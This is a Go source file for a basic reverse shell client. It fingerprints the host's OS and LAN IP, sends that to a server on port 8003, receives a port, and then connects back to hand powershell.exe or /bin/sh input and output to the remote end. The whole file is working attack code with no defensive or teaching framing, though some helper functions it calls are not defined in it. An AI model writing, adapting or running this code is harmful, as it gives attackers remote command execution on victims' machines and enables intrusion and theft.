package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

var HOST_IP string = GetOutboundIP() //"192.168.3.6"

func main() {
	connectPort := GetPort()
	if connectPort == "-1" {
		return
	}
	EstablishConnection(connectPort)
}

func GetPort() string {
	//Get the reverse shell port from the server
	getPort, err := net.Dial("tcp", HOST_IP+":8003")
	if err != nil {
		fmt.Println("Couldn't get connection")
		return "-1"
	}
	defer getPort.Close()
	// ip := GetOutboundIP()
	osFlavor := "n/a"
	// TODO: add OS flavor
	if runtime.GOOS == "linux" {
		osFlavor = getOS()
	} else if runtime.GOOS == "windows" {
		cmd := exec.Command("wmic", "os", "get", "Caption")
		out, _ := cmd.Output()
		osFlavor = string(out)
		osFlavor = osFlavor[strings.Index(osFlavor, "\n")+1:]
		osFlavor = trim(osFlavor[:strings.Index(osFlavor, "\n")])
		cmd.Run()
	}
	it, err := getPort.Write([]byte(
		"INFO:{clientType:Basic Reverse Shell," +
			"lanIP:" + GetOutboundIP() + "," +
			"isEncoded:false" + "," +
			"os:" + runtime.GOOS + "," +
			"osFlavor:" + osFlavor +
			"}\n",
	))
	if err != nil {
		fmt.Println(err.Error())
		fmt.Println(it)
	}
	port, _ := bufio.NewReader(getPort).ReadString('\n')
	return port
}
func EstablishConnection(port string) {
	//Establish reverse connection to host
	con, _ := net.Dial("tcp", HOST_IP+":"+port)
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}
	//Set input/output to the established connection's in/out
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
}
